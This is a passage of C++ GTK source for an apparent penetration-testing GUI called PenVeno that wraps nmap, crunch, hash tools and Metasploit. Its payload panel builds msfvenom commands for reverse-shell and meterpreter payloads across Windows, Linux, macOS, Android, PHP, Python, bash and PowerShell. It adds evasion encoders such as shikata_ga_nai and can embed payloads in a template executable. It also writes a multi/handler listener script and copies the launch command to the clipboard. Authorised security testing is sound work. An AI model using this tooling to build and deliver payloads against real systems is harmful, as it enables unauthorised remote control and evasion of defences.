        payload_copy_cmd_btn.signal_clicked().connect([this]() {
            auto cb = Gtk::Clipboard::get_for_display(get_display());
            cb->set_text(payload_cmd_preview_entry.get_text());
            append_console_output("[✓] Command copied to clipboard: " + payload_cmd_preview_entry.get_text() + "\n");
        });

        payload_gen_handler_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_generate_handler_script));

        payload_run_btn.get_style_context()->add_class("action-btn");
        payload_run_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_run_payload_generator));

        cmd_row->pack_start(*cmd_lbl, Gtk::PACK_SHRINK);
        cmd_row->pack_start(payload_cmd_preview_entry, Gtk::PACK_EXPAND_WIDGET);
        cmd_row->pack_start(payload_copy_cmd_btn, Gtk::PACK_SHRINK);
        cmd_row->pack_start(payload_gen_handler_btn, Gtk::PACK_SHRINK);
        cmd_row->pack_start(payload_run_btn, Gtk::PACK_SHRINK);
        payload_panel.pack_start(*cmd_row, Gtk::PACK_SHRINK);

        update_payload_command_preview();

        payload_scroll.set_policy(Gtk::POLICY_NEVER, Gtk::POLICY_AUTOMATIC);
        payload_scroll.add(payload_panel);
        stack.add(payload_scroll, "payload_page", "💣 Payload Generator");
    }

    std::pair<std::string, std::string> get_selected_payload_info() {
        std::string choice = payload_os_combo.get_active_text();
        if (choice.find("windows/x64/meterpreter_reverse_https") != std::string::npos) {
            return {"windows/x64/meterpreter_reverse_https", "exe"};
        } else if (choice.find("windows/x64/meterpreter_reverse_tcp") != std::string::npos) {
            return {"windows/x64/meterpreter_reverse_tcp", "exe"};
        } else if (choice.find("windows/x64/meterpreter/reverse_tcp") != std::string::npos) {
            return {"windows/x64/meterpreter/reverse_tcp", "exe"};
        } else if (choice.find("windows/x64/shell_reverse_tcp") != std::string::npos) {
            return {"windows/x64/shell_reverse_tcp", "exe"};
        } else if (choice.find("windows/meterpreter_reverse_https") != std::string::npos) {
            return {"windows/meterpreter_reverse_https", "exe"};
        } else if (choice.find("windows/meterpreter_reverse_tcp") != std::string::npos) {
            return {"windows/meterpreter_reverse_tcp", "exe"};
        } else if (choice.find("windows/meterpreter/reverse_tcp") != std::string::npos) {
            return {"windows/meterpreter/reverse_tcp", "exe"};
        } else if (choice.find("windows/shell_reverse_tcp") != std::string::npos) {
            return {"windows/shell_reverse_tcp", "exe"};
        } else if (choice.find("linux/x64/meterpreter_reverse_tcp") != std::string::npos) {
            return {"linux/x64/meterpreter_reverse_tcp", "elf"};
        } else if (choice.find("linux/x64/meterpreter/reverse_tcp") != std::string::npos) {
            return {"linux/x64/meterpreter/reverse_tcp", "elf"};
        } else if (choice.find("linux/x64/shell_reverse_tcp") != std::string::npos) {
            return {"linux/x64/shell_reverse_tcp", "elf"};
        } else if (choice.find("linux/x86/meterpreter/reverse_tcp") != std::string::npos) {
            return {"linux/x86/meterpreter/reverse_tcp", "elf"};
        } else if (choice.find("linux/x86/shell_reverse_tcp") != std::string::npos) {
            return {"linux/x86/shell_reverse_tcp", "elf"};
        } else if (choice.find("osx/aarch64/meterpreter_reverse_tcp") != std::string::npos) {
            return {"osx/aarch64/meterpreter_reverse_tcp", "macho"};
        } else if (choice.find("osx/x64/meterpreter_reverse_tcp") != std::string::npos) {
            return {"osx/x64/meterpreter_reverse_tcp", "macho"};
        } else if (choice.find("android/meterpreter_reverse_https") != std::string::npos) {
            return {"android/meterpreter_reverse_https", "apk"};
        } else if (choice.find("android/meterpreter/reverse_tcp") != std::string::npos) {
            return {"android/meterpreter/reverse_tcp", "apk"};
        } else if (choice.find("php/meterpreter_reverse_tcp") != std::string::npos) {
            return {"php/meterpreter_reverse_tcp", "raw"};
        } else if (choice.find("python/meterpreter_reverse_tcp") != std::string::npos) {
            return {"python/meterpreter_reverse_tcp", "raw"};
        } else if (choice.find("cmd/unix/reverse_bash") != std::string::npos) {
            return {"cmd/unix/reverse_bash", "raw"};
        } else if (choice.find("windows/x64/powershell_reverse_tcp") != std::string::npos) {
            return {"windows/x64/powershell_reverse_tcp", "ps1"};
        }
        return {"windows/x64/meterpreter_reverse_tcp", "exe"};
    }

    void on_payload_os_changed() {
        auto [name, fmt] = get_selected_payload_info();
        std::string ext = fmt;
        if (fmt == "raw") {
            if (name.find("php") != std::string::npos) ext = "php";
            else if (name.find("python") != std::string::npos) ext = "py";
            else if (name.find("bash") != std::string::npos) ext = "sh";
        }
        payload_output_entry.set_text("payload." + ext);
        update_payload_command_preview();
    }

    std::vector<std::string> build_payload_args() {
        std::string lhost = payload_lhost_combo.get_active_id();
        if (lhost.empty()) lhost = payload_lhost_combo.get_active_text();
        if (lhost.empty()) lhost = "127.0.0.1";

        std::string lport = payload_lport_entry.get_text();
        if (lport.empty()) lport = "4444";

        std::string out_file = payload_output_entry.get_text();
        if (out_file.empty()) out_file = "payload.bin";

        auto [payload_name, format] = get_selected_payload_info();

        std::vector<std::string> args = {
            "msfvenom",
            "-p", payload_name,
            "LHOST=" + lhost,
            "LPORT=" + lport,
            "-f", format,
            "-o", out_file
        };

        std::string encoder = payload_encoder_combo.get_active_text();
        if (encoder.rfind("None", 0) != 0) {
            std::string enc_name;
            if (encoder.find("x86/shikata_ga_nai") != std::string::npos) enc_name = "x86/shikata_ga_nai";
            else if (encoder.find("x64/zutto_dekiru") != std::string::npos) enc_name = "x64/zutto_dekiru";
            else if (encoder.find("x86/xor_dynamic") != std::string::npos) enc_name = "x86/xor_dynamic";
            else if (encoder.find("cmd/powershell_base64") != std::string::npos) enc_name = "cmd/powershell_base64";

            if (!enc_name.empty()) {
                args.push_back("-e");
                args.push_back(enc_name);
                std::string iters = payload_iterations_entry.get_text();
                if (!iters.empty() && std::all_of(iters.begin(), iters.end(), ::isdigit)) {
                    args.push_back("-i");
                    args.push_back(iters);
                }
            }
        }

        std::string badchars = payload_badchars_entry.get_text();
        if (!badchars.empty()) {
            args.push_back("-b");
            args.push_back(badchars);
        }

        std::string tmpl = payload_template_entry.get_text();
        if (!tmpl.empty()) {
            args.push_back("-x");
            args.push_back(tmpl);
            if (payload_template_keep_check.get_active()) {
                args.push_back("-k");
            }
        }

        return args;
    }

    void update_payload_command_preview() {
        auto args = build_payload_args();
        std::string full_cmd;
        for (const auto& a : args) full_cmd += a + " ";
        payload_cmd_preview_entry.set_text(full_cmd);
    }

    // --- Page 5: Wordlist Generator (Crunch) ---
    void build_wordlist_panel() {
        wordlist_panel.get_style_context()->add_class("tool-page");

        Gtk::Label* header = Gtk::manage(new Gtk::Label("Crunch Custom Wordlist Generator"));
        header->get_style_context()->add_class("form-header");
        header->set_xalign(0);
        wordlist_panel.pack_start(*header, Gtk::PACK_SHRINK);

        Gtk::Box* len_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* min_lbl = Gtk::manage(new Gtk::Label("Min Length:"));
        wordlist_min_entry.set_text("4");
        wordlist_min_entry.set_width_chars(6);
        Gtk::Label* max_lbl = Gtk::manage(new Gtk::Label("Max Length:"));
        wordlist_max_entry.set_text("6");
        wordlist_max_entry.set_width_chars(6);

        len_row->pack_start(*min_lbl, Gtk::PACK_SHRINK);
        len_row->pack_start(wordlist_min_entry, Gtk::PACK_SHRINK);
        len_row->pack_start(*max_lbl, Gtk::PACK_SHRINK);
        len_row->pack_start(wordlist_max_entry, Gtk::PACK_SHRINK);
        wordlist_panel.pack_start(*len_row, Gtk::PACK_SHRINK);

        Gtk::Box* cs_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* cs_lbl = Gtk::manage(new Gtk::Label("Character Set Preset:"));
        wordlist_charset_combo.append("Numeric (0123456789)");
        wordlist_charset_combo.append("Lowercase (abcdefghijklmnopqrstuvwxyz)");
        wordlist_charset_combo.append("Uppercase (ABCDEFGHIJKLMNOPQRSTUVWXYZ)");
        wordlist_charset_combo.append("Lowercase + Numbers (abcdefghijklmnopqrstuvwxyz0123456789)");
        wordlist_charset_combo.append("Full Alphanumeric (a-z, A-Z, 0-9)");
        wordlist_charset_combo.append("Alphanumeric + Special Characters");
        wordlist_charset_combo.append("Custom Character Set");
        wordlist_charset_combo.set_active(0);
        cs_row->pack_start(*cs_lbl, Gtk::PACK_SHRINK);
        cs_row->pack_start(wordlist_charset_combo, Gtk::PACK_EXPAND_WIDGET);
        wordlist_panel.pack_start(*cs_row, Gtk::PACK_SHRINK);

        Gtk::Box* custom_cs_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* custom_lbl = Gtk::manage(new Gtk::Label("Custom Characters:"));
        wordlist_custom_charset_entry.set_placeholder_text("e.g. abcdef123!@#");
        custom_cs_row->pack_start(*custom_lbl, Gtk::PACK_SHRINK);
        custom_cs_row->pack_start(wordlist_custom_charset_entry, Gtk::PACK_EXPAND_WIDGET);
        wordlist_panel.pack_start(*custom_cs_row, Gtk::PACK_SHRINK);

        custom_lbl->hide();
        wordlist_custom_charset_entry.hide();

        wordlist_charset_combo.signal_changed().connect([this, custom_lbl]() {
            if (wordlist_charset_combo.get_active_text() == "Custom Character Set") {
                custom_lbl->show();
                wordlist_custom_charset_entry.show();
            } else {
                custom_lbl->hide();
                wordlist_custom_charset_entry.hide();
            }
        });

        Gtk::Box* out_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        Gtk::Label* out_lbl = Gtk::manage(new Gtk::Label("Output Wordlist File:"));
        wordlist_output_entry.set_text("wordlist.txt");
        wordlist_browse_btn.signal_clicked().connect([this]() {
            Gtk::FileChooserDialog dialog(*this, "Save Wordlist As", Gtk::FILE_CHOOSER_ACTION_SAVE);
            dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
            dialog.add_button("Save", Gtk::RESPONSE_OK);
            dialog.set_current_name(wordlist_output_entry.get_text());
            if (dialog.run() == Gtk::RESPONSE_OK) {
                wordlist_output_entry.set_text(dialog.get_filename());
            }
        });
        out_row->pack_start(*out_lbl, Gtk::PACK_SHRINK);
        out_row->pack_start(wordlist_output_entry, Gtk::PACK_EXPAND_WIDGET);
        out_row->pack_start(wordlist_browse_btn, Gtk::PACK_SHRINK);
        wordlist_panel.pack_start(*out_row, Gtk::PACK_SHRINK);

        wordlist_run_btn.get_style_context()->add_class("action-btn");
        wordlist_run_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_run_wordlist_generator));
        wordlist_panel.pack_start(wordlist_run_btn, Gtk::PACK_SHRINK);

        stack.add(wordlist_panel, "wordlist_page", "🔤 Custom Wordlist");
    }

    // --- Page 6: Hash Tools ---
    void build_hash_panel() {
        hash_panel.get_style_context()->add_class("tool-page");

        Gtk::Label* header = Gtk::manage(new Gtk::Label("Hash Identifier & Cryptographic Generator"));
        header->get_style_context()->add_class("form-header");
        header->set_xalign(0);
        hash_panel.pack_start(*header, Gtk::PACK_SHRINK);

        // Identification Section
        Gtk::Label* id_header = Gtk::manage(new Gtk::Label("1. Identify Hash Algorithm (MD5 / SHA / NTLM / Bcrypt)"));
        id_header->set_xalign(0);
        hash_panel.pack_start(*id_header, Gtk::PACK_SHRINK);

        Gtk::Box* id_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        hash_input_entry.set_placeholder_text("Paste unknown hash string here (e.g. 5d41402abc4b2a76b9719d911017c592)");
        hash_identify_btn.get_style_context()->add_class("action-btn");
        hash_identify_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_identify_hash));
        id_row->pack_start(hash_input_entry, Gtk::PACK_EXPAND_WIDGET);
        id_row->pack_start(hash_identify_btn, Gtk::PACK_SHRINK);
        hash_panel.pack_start(*id_row, Gtk::PACK_SHRINK);

        // Generator Section
        Gtk::Label* gen_header = Gtk::manage(new Gtk::Label("2. Compute Hashes from Plain Text"));
        gen_header->set_xalign(0);
        hash_panel.pack_start(*gen_header, Gtk::PACK_SHRINK);

        Gtk::Box* gen_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
        hash_plain_entry.set_placeholder_text("Enter plain text string to calculate hashes");
        hash_generate_btn.get_style_context()->add_class("action-btn");
        hash_generate_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_generate_hashes));
        gen_row->pack_start(hash_plain_entry, Gtk::PACK_EXPAND_WIDGET);
        gen_row->pack_start(hash_generate_btn, Gtk::PACK_SHRINK);
        hash_panel.pack_start(*gen_row, Gtk::PACK_SHRINK);

        stack.add(hash_panel, "hash_page", "🛡️ Hash Tools");
    }

    // --- Bottom Console Panel ---
    void build_console_panel() {
        console_panel.get_style_context()->add_class("console-panel");

        console_title.set_markup("<b>Live Output Terminal &amp; Logs</b>");
        console_title.set_xalign(0);
        console_header.pack_start(console_title, Gtk::PACK_SHRINK);

        autoscroll_check.set_active(true);
        console_header.pack_end(autoscroll_check, Gtk::PACK_SHRINK);

        export_console_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_export_report));
        console_header.pack_end(export_console_btn, Gtk::PACK_SHRINK);

        copy_console_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_copy_console));
        console_header.pack_end(copy_console_btn, Gtk::PACK_SHRINK);

        clear_console_btn.signal_clicked().connect([this]() {
            console_buffer->set_text("");
        });
        console_header.pack_end(clear_console_btn, Gtk::PACK_SHRINK);

        console_panel.pack_start(console_header, Gtk::PACK_SHRINK);

        console_view.get_style_context()->add_class("console-view");
        console_view.set_editable(false);
        console_view.set_cursor_visible(false);
        console_view.set_wrap_mode(Gtk::WRAP_WORD_CHAR);
        console_buffer = console_view.get_buffer();

        console_scroll.add(console_view);
        console_scroll.set_policy(Gtk::POLICY_AUTOMATIC, Gtk::POLICY_AUTOMATIC);
        console_panel.pack_start(console_scroll, Gtk::PACK_EXPAND_WIDGET);
    }

    void refresh_network_interfaces() {
        payload_lhost_combo.remove_all();
        auto ifaces = SecurityUtils::get_local_interfaces();
        int active_idx = 0;
        int i = 0;
        for (const auto& [name, ip] : ifaces) {
            std::string label = name + " (" + ip + ")";
            payload_lhost_combo.append(ip, label);
            if (name != "lo" && active_idx == 0) {
                active_idx = i;
            }
            i++;
        }
        if (!ifaces.empty()) {
            payload_lhost_combo.set_active(active_idx);
        }
    }

    void init_console_tags() {
        auto tag_green = console_buffer->create_tag("tag_green");
        tag_green->property_foreground() = "#a6e3a1"; // Green
        tag_green->property_weight() = PANGO_WEIGHT_BOLD;

        auto tag_cyan = console_buffer->create_tag("tag_cyan");
        tag_cyan->property_foreground() = "#89b4fa"; // Cyan / Blue
        tag_cyan->property_weight() = PANGO_WEIGHT_BOLD;

        auto tag_yellow = console_buffer->create_tag("tag_yellow");
        tag_yellow->property_foreground() = "#f9e2af"; // Amber / Yellow

        auto tag_red = console_buffer->create_tag("tag_red");
        tag_red->property_foreground() = "#f38ba8"; // Red
        tag_red->property_weight() = PANGO_WEIGHT_BOLD;
    }

    void parse_nmap_line(const std::string& line) {
        // Pattern 1: Discovered open port 80/tcp on 192.168.88.2
        static const std::regex disc_regex(R"(Discovered open port (\S+) on (\S+))");
        std::smatch match;
        if (std::regex_search(line, match, disc_regex)) {
            std::string port = match[1].str();
            std::string ip = match[2].str();
            live_hosts[ip].ip = ip;
            live_hosts[ip].ports.insert(port);
            return;
        }

        // Pattern 2: Nmap scan report for host (ip) or Nmap scan report for ip
        static const std::regex rep_regex(R"(Nmap scan report for (?:([^\s()]+)\s+\(([^)]+)\)|([^\s()]+)))");
        if (std::regex_search(line, match, rep_regex)) {
            std::string host_or_ip = match[3].matched ? match[3].str() : match[2].str();
            std::string name = match[1].matched ? match[1].str() : "";
            if (line.find("[host down]") == std::string::npos) {
                current_scan_host = host_or_ip;
                live_hosts[host_or_ip].ip = host_or_ip;
                if (!name.empty()) live_hosts[host_or_ip].hostname = name;
            } else {
                current_scan_host.clear();
            }
            return;
        }

        // Pattern 3: 80/tcp open http Apache...
        static const std::regex port_regex(R"(^(\d+/(?:tcp|udp))\s+open\s+(\S+))");
        if (!current_scan_host.empty() && std::regex_search(line, match, port_regex)) {
            std::string port_svc = match[1].str() + " (" + match[2].str() + ")";
            live_hosts[current_scan_host].ports.insert(port_svc);
        }
    }

    void append_console_output(const std::string& text) {
        std::istringstream stream(text);
        std::string line;
        while (std::getline(stream, line)) {
            if (!line.empty() && line.back() == '\r') line.pop_back();

            // Track discovered active hosts
            parse_nmap_line(line);

            // Filter out 250+ lines of '[host down]' clutter when --open is active
            if (line.find("[host down]") != std::string::npos && nmap_open_check.get_active()) {
                continue;
            }

            // Filter out transient tester status lines from dirb
            if (line.find("--> Testing:") != std::string::npos) {
                continue;
            }

            std::string tag_name;
            if (line.find("open") != std::string::npos ||
                line.find("Host is up") != std::string::npos ||
                line.find("Discovered open port") != std::string::npos ||
                line.find("[✓]") != std::string::npos ||
                line.find("[+]") != std::string::npos) {
                tag_name = "tag_green";
            } else if (line.find("closed") != std::string::npos ||
                       line.find("[host down]") != std::string::npos ||
                       line.find("[!]") != std::string::npos ||
                       line.find("QUITTING") != std::string::npos ||
                       line.find("dropped") != std::string::npos) {
                tag_name = "tag_red";
            } else if (line.find("Stats:") != std::string::npos ||
                       line.find("Timing:") != std::string::npos ||
                       line.find("WARNING:") != std::string::npos ||
                       line.find("CVE-") != std::string::npos ||
                       line.find("vulners:") != std::string::npos) {
                tag_name = "tag_yellow";
            } else if (line.find("[▶]") != std::string::npos ||
                       line.find("Starting Nmap") != std::string::npos ||
                       line.find("PORT     STATE") != std::string::npos ||
                       line.find("Nmap scan report") != std::string::npos ||
                       line.find("NSE:") != std::string::npos) {
                tag_name = "tag_cyan";
            }

            auto iter = console_buffer->end();
            if (!tag_name.empty()) {
                auto tag = console_buffer->get_tag_table()->lookup(tag_name);
                if (tag) {
                    console_buffer->insert_with_tag(iter, line + "\n", tag);
                } else {
                    console_buffer->insert(iter, line + "\n");
                }
            } else {
                console_buffer->insert(iter, line + "\n");
            }
        }

        if (autoscroll_check.get_active()) {
            auto mark = console_buffer->create_mark(console_buffer->end());
            console_view.scroll_to(mark);
        }
    }

    void on_log_dispatched() {
        std::queue<std::string> local_queue;
        {
            std::lock_guard<std::mutex> lock(queue_mutex);
            local_queue.swap(output_queue);
        }
        while (!local_queue.empty()) {
            append_console_output(local_queue.front());
            local_queue.pop();
        }
    }

    void on_process_finished() {
        is_process_running = false;
        current_pid = -1;
        spinner.stop();
        status_badge.set_text("IDLE");
        status_badge.get_style_context()->remove_class("running");
        status_badge.get_style_context()->add_class("idle");
        stop_button.set_sensitive(false);
        set_inputs_sensitive(true);

        if (!live_hosts.empty()) {
            std::ostringstream summary;
            summary << "\n╔═════════════════════════════════════════════════════════════════════════════╗\n";
            summary << "║               🎯 ACTIVE DEVICES & OPEN SERVICES DISCOVERED                  ║\n";
            summary << "╚═════════════════════════════════════════════════════════════════════════════╝\n\n";

            active_hosts_combo.remove_all();
            active_hosts_combo.append("", "Select Live Target (" + std::to_string(live_hosts.size()) + " Found)");

            for (const auto& [ip, host] : live_hosts) {
                summary << "  [ 🟢 UP ] " << std::left << std::setw(16) << ip;
                if (!host.hostname.empty()) {
                    summary << " (" << host.hostname << ")";
                }
                summary << "\n           Ports: ";
                if (host.ports.empty()) {
                    summary << "Alive (Ping response only / No open ports)";
                } else {
                    bool first = true;
                    for (const auto& p : host.ports) {
                        if (!first) summary << ", ";
                        summary << p;
                        first = false;
                    }
                }
                summary << "\n\n";

                std::string combo_label = ip + " (" + std::to_string(host.ports.size()) + " ports)";
                active_hosts_combo.append(ip, combo_label);
            }
            summary << "─────────────────────────────────────────────────────────────────────────────\n";
            append_console_output(summary.str());
            active_hosts_combo.set_active(0);
        }

        append_console_output("\n[✓] Task finished: " + current_task_name + "\n");
        append_console_output("─────────────────────────────────────────────────────────────────────────────\n\n");
    }

    void set_inputs_sensitive(bool sensitive) {
        nmap_run_btn.set_sensitive(sensitive);
        dns_run_btn.set_sensitive(sensitive);
        payload_run_btn.set_sensitive(sensitive);
        payload_gen_handler_btn.set_sensitive(sensitive);
        wordlist_run_btn.set_sensitive(sensitive);
    }

    void execute_command_async(const std::string& task_name, const std::vector<std::string>& args) {
        if (is_process_running) {
            Gtk::MessageDialog dlg(*this, "A task is already running. Please wait or stop it first.", false, Gtk::MESSAGE_WARNING);
            dlg.run();
            return;
        }

        if (worker_thread.joinable()) {
            worker_thread.join();
        }

        current_task_name = task_name;
        live_hosts.clear();
        current_scan_host.clear();
        is_process_running = true;
        spinner.start();
        status_badge.set_text("RUNNING");
        status_badge.get_style_context()->remove_class("idle");
        status_badge.get_style_context()->add_class("running");
        stop_button.set_sensitive(true);
        set_inputs_sensitive(false);

        std::string cmd_repr;
        for (const auto& a : args) cmd_repr += a + " ";
        append_console_output("[▶] Starting task: " + task_name + "\n");
        append_console_output("[*] Executing: " + cmd_repr + "\n\n");

        worker_thread = std::thread([this, args]() {
            int pipefd[2];
            if (pipe(pipefd) == -1) {
                {
                    std::lock_guard<std::mutex> lock(queue_mutex);
                    output_queue.push("[!] Error creating pipe for process.\n");
                }
                log_dispatcher.emit();
                process_finished_dispatcher.emit();
                return;
            }

            pid_t pid = fork();
            if (pid == 0) {
                // Child: create own process group for clean termination
                setpgid(0, 0);
                ::close(pipefd[0]);
                dup2(pipefd[1], STDOUT_FILENO);
                dup2(pipefd[1], STDERR_FILENO);
                ::close(pipefd[1]);

                std::vector<char*> c_args;
                c_args.reserve(args.size() + 1);
                for (const auto& s : args) {
                    c_args.push_back(const_cast<char*>(s.c_str()));
                }
                c_args.push_back(nullptr);

                execvp(c_args[0], c_args.data());
                std::cerr << "Command not found: " << c_args[0] << std::endl;
                _exit(127);
            } else if (pid > 0) {
                // Parent
                current_pid = pid;
                ::close(pipefd[1]);

                char buffer[1024];
                ssize_t bytes_read;
                while ((bytes_read = read(pipefd[0], buffer, sizeof(buffer) - 1)) > 0) {
                    buffer[bytes_read] = '\0';
                    {
                        std::lock_guard<std::mutex> lock(queue_mutex);
                        output_queue.push(std::string(buffer));
                    }
                    log_dispatcher.emit();
                }
                ::close(pipefd[0]);

                int status = 0;
                waitpid(pid, &status, 0);

                process_finished_dispatcher.emit();
            } else {
                ::close(pipefd[0]);
                ::close(pipefd[1]);
                {
                    std::lock_guard<std::mutex> lock(queue_mutex);
                    output_queue.push("[!] Fork failed.\n");
                }
                log_dispatcher.emit();
                process_finished_dispatcher.emit();
            }
        });
    }

    void stop_running_process() {
        if (current_pid > 0) {
            append_console_output("\n[!] Sending termination signal to process PID " + std::to_string(current_pid) + "...\n");
            kill(-current_pid, SIGTERM);
            usleep(50000);
            kill(-current_pid, SIGKILL);
        }
    }

    void on_stop_clicked() {
        stop_running_process();
    }

    // --- Action Handlers ---

    void on_run_nmap_scan() {
        std::string target = nmap_target_entry.get_text();
        if (!SecurityUtils::is_valid_target(target)) {
            Gtk::MessageDialog dlg(*this, "Please enter a valid target IP, hostname, or subnet.", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }

        auto args = build_nmap_args();
        execute_command_async("Nmap Master Scan", args);
    }

    void on_run_dns_recon() {
        std::string target = dns_target_entry.get_text();
        if (!SecurityUtils::is_valid_target(target)) {
            Gtk::MessageDialog dlg(*this, "Please enter a valid domain, IP address, or URL.", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }

        auto args = build_dns_args();
        execute_command_async("DNS & Web Recon", args);
    }

    void on_run_payload_generator() {
        std::string lhost = payload_lhost_combo.get_active_id();
        if (lhost.empty()) lhost = payload_lhost_combo.get_active_text();
        std::string lport = payload_lport_entry.get_text();

        if (lhost.empty() || !SecurityUtils::is_valid_target(lhost)) {
            Gtk::MessageDialog dlg(*this, "Please select or provide a valid LHOST address.", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }
        if (!SecurityUtils::is_valid_port_str(lport)) {
            Gtk::MessageDialog dlg(*this, "Please enter a valid LPORT (1 - 65535).", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }

        auto args = build_payload_args();
        execute_command_async("Metasploit Payload Generation", args);
    }

    void on_generate_handler_script() {
        std::string lhost = payload_lhost_combo.get_active_id();
        if (lhost.empty()) lhost = payload_lhost_combo.get_active_text();
        std::string lport = payload_lport_entry.get_text();
        if (lhost.empty() || !SecurityUtils::is_valid_target(lhost)) {
            Gtk::MessageDialog dlg(*this, "Please select or provide a valid LHOST address.", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }
        if (!SecurityUtils::is_valid_port_str(lport)) {
            Gtk::MessageDialog dlg(*this, "Please enter a valid LPORT (1 - 65535).", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }

        auto [payload_name, format] = get_selected_payload_info();

        std::string rc_filename = "handler_" + lport + ".rc";
        std::ofstream rc_file(rc_filename);
        if (!rc_file.is_open()) {
            Gtk::MessageDialog dlg(*this, "Failed to write handler resource file.", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }

        rc_file << "use exploit/multi/handler\n";
        rc_file << "set PAYLOAD " << payload_name << "\n";
        rc_file << "set LHOST " << lhost << "\n";
        rc_file << "set LPORT " << lport << "\n";
        rc_file << "set ExitOnSession false\n";
        rc_file << "exploit -j -z\n";
        rc_file.close();

        std::string launch_cmd = "msfconsole -q -r " + rc_filename;
        auto cb = Gtk::Clipboard::get_for_display(get_display());
        cb->set_text(launch_cmd);

        append_console_output("\n╔═════════════════════════════════════════════════════════════════════════════╗\n");
        append_console_output("║            METASPLOIT MULTI/HANDLER LISTENER SCRIPT GENERATED               ║\n");
        append_console_output("╚═════════════════════════════════════════════════════════════════════════════╝\n");
        append_console_output("[✓] Script written: " + rc_filename + "\n");
        append_console_output("[*] Configuration parameters:\n");
        append_console_output("    Payload : " + payload_name + "\n");
        append_console_output("    LHOST   : " + lhost + "\n");
        append_console_output("    LPORT   : " + lport + "\n\n");
        append_console_output("[*] Start listener anytime with:\n    " + launch_cmd + "\n");
        append_console_output("[✓] Listener launch command automatically copied to clipboard!\n\n");
    }

    void on_run_wordlist_generator() {
        std::string min_len = wordlist_min_entry.get_text();
        std::string max_len = wordlist_max_entry.get_text();
        std::string out_file = wordlist_output_entry.get_text();

        if (min_len.empty() || max_len.empty() ||
            !std::all_of(min_len.begin(), min_len.end(), ::isdigit) ||
            !std::all_of(max_len.begin(), max_len.end(), ::isdigit)) {
            Gtk::MessageDialog dlg(*this, "Min and Max length must be numeric.", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }

        int min_val = std::stoi(min_len);
        int max_val = std::stoi(max_len);
        if (min_val <= 0 || max_val <= 0 || min_val > max_val) {
            Gtk::MessageDialog dlg(*this, "Min length must be > 0 and less than or equal to Max length.", false, Gtk::MESSAGE_ERROR);
            dlg.run();
            return;
        }

        if (out_file.empty()) {
            out_file = "wordlist.txt";
        }

        std::string charset_choice = wordlist_charset_combo.get_active_text();
        std::string charset;
        if (charset_choice.rfind("Numeric", 0) == 0) {
            charset = "0123456789";
        } else if (charset_choice.rfind("Lowercase (", 0) == 0) {
            charset = "abcdefghijklmnopqrstuvwxyz";
        } else if (charset_choice.rfind("Uppercase", 0) == 0) {
            charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
        } else if (charset_choice.rfind("Lowercase + Numbers", 0) == 0) {
            charset = "abcdefghijklmnopqrstuvwxyz0123456789";
        } else if (charset_choice.rfind("Full Alphanumeric", 0) == 0) {
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        } else if (charset_choice.rfind("Alphanumeric + Special", 0) == 0) {
            charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+";
        } else {
            charset = wordlist_custom_charset_entry.get_text();
            if (charset.empty()) {
                Gtk::MessageDialog dlg(*this, "Please specify a custom character set.", false, Gtk::MESSAGE_ERROR);
                dlg.run();
                return;
            }
        }

        std::vector<std::string> args = {
            "crunch",
            min_len,
            max_len,
            charset,
            "-o", out_file
        };

        execute_command_async("Crunch Custom Wordlist Generation", args);
    }

    void on_identify_hash() {
        std::string input = hash_input_entry.get_text();
        std::string report = SecurityUtils::identify_hash(input);
        append_console_output("\n" + report + "\n");
    }

    void on_generate_hashes() {
        std::string plain = hash_plain_entry.get_text();
        if (plain.empty()) {
            Gtk::MessageDialog dlg(*this, "Please enter text to calculate hashes.", false, Gtk::MESSAGE_INFO);
            dlg.run();
            return;
        }

        std::ostringstream out;
        out << "\n[#] Cryptographic Hashes for: \"" << plain << "\"\n";
        out << "    MD5:    " << SecurityUtils::compute_hash(plain, "MD5") << "\n";
        out << "    SHA1:   " << SecurityUtils::compute_hash(plain, "SHA1") << "\n";
        out << "    SHA256: " << SecurityUtils::compute_hash(plain, "SHA256") << "\n";
        out << "    SHA512: " << SecurityUtils::compute_hash(plain, "SHA512") << "\n\n";
        append_console_output(out.str());
    }

    void on_copy_console() {
        auto clipboard = Gtk::Clipboard::get_for_display(get_display());
        clipboard->set_text(console_buffer->get_text());
        append_console_output("[✓] Console content copied to clipboard.\n");
    }

    void on_export_report() {
        Gtk::FileChooserDialog dialog(*this, "Export PenVeno Scan Report", Gtk::FILE_CHOOSER_ACTION_SAVE);
        dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
        dialog.add_button("Save Report", Gtk::RESPONSE_OK);

        auto now = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        std::stringstream ss;
        ss << "PenVeno_Report_" << std::put_time(std::localtime(&now), "%Y%m%d_%H%M%S") << ".txt";
        dialog.set_current_name(ss.str());

        if (dialog.run() == Gtk::RESPONSE_OK) {
            std::string filename = dialog.get_filename();
            std::ofstream outfile(filename);
